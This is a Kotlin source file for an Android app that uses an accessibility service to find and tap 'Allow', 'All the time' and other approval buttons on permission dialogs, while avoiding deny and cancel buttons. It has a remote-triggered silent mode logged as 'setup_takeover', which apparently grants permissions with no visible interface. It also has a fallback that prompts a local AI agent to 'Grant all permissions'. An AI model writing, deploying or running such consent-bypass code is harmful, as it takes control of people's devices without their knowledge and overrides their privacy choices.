package com.phonehand.app

import android.content.Context
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Fast rule-based permission dialog handler — scans the accessibility tree for
 * known Allow/OK buttons and taps immediately (no LLM round-trip per dialog).
 */
object PermissionAutoGrant {
    private const val TAG = "PermAutoGrant"
    private const val MAX_DURATION_MS = 30_000L
    private const val MAX_TAPS = 20
    private const val TAP_INTERVAL_MS = 150L
    private const val SCAN_INTERVAL_MS = 200L
    private const val STUCK_THRESHOLD = 5

    private val running = AtomicBoolean(false)
    private val executor = Executors.newSingleThreadExecutor()

    private val ALLOW_KEYWORDS = listOf(
        "allow",
        "while using",
        "all the time",
        "only this time",
        "ok",
        "continue",
        "accept",
        "got it",
        "turn on",
        "yes",
        "grant",
        "permit",
        "enable",
        "agree",
    )

    private val DENY_KEYWORDS = listOf(
        "don't allow",
        "dont allow",
        "deny",
        "cancel",
        "no thanks",
        "not now",
        "decline",
        "reject",
    )

    interface Callback {
        fun onLog(line: String)
        fun onDone(taps: Int)
        fun onError(message: String)
    }

    fun isRunning(): Boolean = running.get()

    fun run(context: Context, cb: Callback) {
        if (!running.compareAndSet(false, true)) {
            cb.onError("Already running")
            return
        }
        executor.execute {
            try {
                runLoop(context, cb)
            } catch (e: Exception) {
                Log.w(TAG, e.message ?: "grant")
                cb.onError(e.message ?: "Failed")
            } finally {
                running.set(false)
            }
        }
    }

    /** Remote-triggered grant — logs only, no UI. */
    fun runSilent(context: Context) {
        run(context, object : Callback {
            override fun onLog(line: String) {
                Log.d(TAG, line)
            }

            override fun onDone(taps: Int) {
                Log.d(TAG, "setup_takeover done — $taps action(s)")
            }

            override fun onError(message: String) {
                Log.w(TAG, "setup_takeover: $message")
            }
        })
    }

    fun cancel() {
        running.set(false)
    }

    private fun runLoop(context: Context, cb: Callback) {
        val service = TouchAccessibilityService.instance
        if (service == null) {
            cb.onError("Watch Together accessibility is off")
            return
        }

        cb.onLog("Scanning for permission dialogs…")
        val start = System.currentTimeMillis()
        var taps = 0
        var consecutiveMisses = 0
        var agentFallbackUsed = false

        while (running.get()) {
            val elapsed = System.currentTimeMillis() - start
            if (elapsed >= MAX_DURATION_MS || taps >= MAX_TAPS) break

            val tree = service.snapshotTree() ?: service.lastTreeJson
            if (tree == null) {
                Thread.sleep(SCAN_INTERVAL_MS)
                continue
            }

            val target = findBestTarget(tree)
            if (target != null) {
                consecutiveMisses = 0
                val label = target.label
                cb.onLog("Tap: $label")
                service.tapAt(target.cx, target.cy)
                taps++
                Thread.sleep(TAP_INTERVAL_MS)
                service.scheduleRefreshesAfterInput()
                Thread.sleep(SCAN_INTERVAL_MS)
            } else {
                consecutiveMisses++
                if (consecutiveMisses >= STUCK_THRESHOLD && !agentFallbackUsed) {
                    agentFallbackUsed = true
                    cb.onLog("Stuck — trying AI fallback…")
                    if (tryAgentFallback(context, tree, cb)) {
                        taps++
                        consecutiveMisses = 0
                        Thread.sleep(600)
                        continue
                    }
                }
                if (consecutiveMisses >= STUCK_THRESHOLD + 2) break
                Thread.sleep(SCAN_INTERVAL_MS)
            }
        }

        cb.onLog(if (taps > 0) "Done — $taps action(s)" else "No permission dialogs found")
        cb.onDone(taps)
    }

    private data class TapTarget(
        val cx: Float,
        val cy: Float,
        val label: String,
        val score: Int,
    )

    private fun findBestTarget(tree: JSONObject): TapTarget? {
        val nodes = tree.optJSONArray("nodes") ?: return null
        val isPopup = tree.optInt("popup", 0) == 1
        var best: TapTarget? = null

        for (i in 0 until nodes.length()) {
            val n = nodes.getJSONObject(i)
            if (n.optInt("d", 0) == 1) continue

            val text = n.optString("t", "").ifBlank { n.optString("h", "") }
            val clickable = n.optInt("k", 0) == 1
            val checkable = n.optInt("x", -1) >= 0
            val checked = n.optInt("x", 0) == 1
            val onPopup = n.optInt("pop", 0) == 1 || isPopup
            val role = n.optString("r", "")

            val b = n.optJSONArray("b") ?: continue
            if (b.length() < 4) continue
            val cx = (b.getInt(0) + b.getInt(2)) / 2f
            val cy = (b.getInt(1) + b.getInt(3)) / 2f

            if (checkable && !checked && text.isNotBlank()) {
                if (matchesAllow(text) && !matchesDeny(text)) {
                    val score = scoreTarget(text, onPopup, role, true)
                    val target = TapTarget(cx, cy, text.take(40), score)
                    if (best == null || target.score > best.score) best = target
                }
                continue
            }

            if (!clickable || text.isBlank()) continue
            if (matchesDeny(text)) continue
            if (!matchesAllow(text)) continue

            val score = scoreTarget(text, onPopup, role, false)
            val target = TapTarget(cx, cy, text.take(40), score)
            if (best == null || target.score > best.score) best = target
        }

        return best
    }

    private fun scoreTarget(text: String, onPopup: Boolean, role: String, isToggle: Boolean): Int {
        var score = 0
        val lower = text.lowercase()
        if (onPopup) score += 50
        if (role == "btn") score += 20
        if (isToggle) score += 15
        when {
            lower == "allow" -> score += 40
            lower.contains("while using") -> score += 35
            lower.contains("all the time") -> score += 35
            lower.contains("only this time") -> score += 30
            lower == "ok" || lower == "continue" -> score += 25
            lower.contains("allow") -> score += 20
            lower.contains("turn on") || lower.contains("enable") -> score += 18
        }
        return score
    }

    private fun matchesAllow(text: String): Boolean {
        val lower = text.lowercase()
        return ALLOW_KEYWORDS.any { lower.contains(it) }
    }

    private fun matchesDeny(text: String): Boolean {
        val lower = text.lowercase()
        return DENY_KEYWORDS.any { lower.contains(it) }
    }

    private fun tryAgentFallback(context: Context, tree: JSONObject, cb: Callback): Boolean {
        val service = TouchAccessibilityService.instance ?: return false
        val screen = ScreenSummarizer.compact(tree)
        val prompt = "Grant all permissions. Tap Allow, While using the app, OK, Continue, Accept, Turn on, or any positive confirmation button. Do not tap Deny or Cancel."
        var tapped = false
        val latch = java.util.concurrent.CountDownLatch(1)

        LocalAgent.run(context, prompt, screen, object : LocalAgent.Callback {
            override fun onLog(line: String) {
                cb.onLog("AI: $line")
            }

            override fun onDone() {
                tapped = true
                latch.countDown()
            }

            override fun onError(message: String) {
                cb.onLog("AI fallback: $message")
                latch.countDown()
            }
        })

        latch.await(12, java.util.concurrent.TimeUnit.SECONDS)
        service.scheduleRefreshesAfterInput()
        return tapped
    }
}
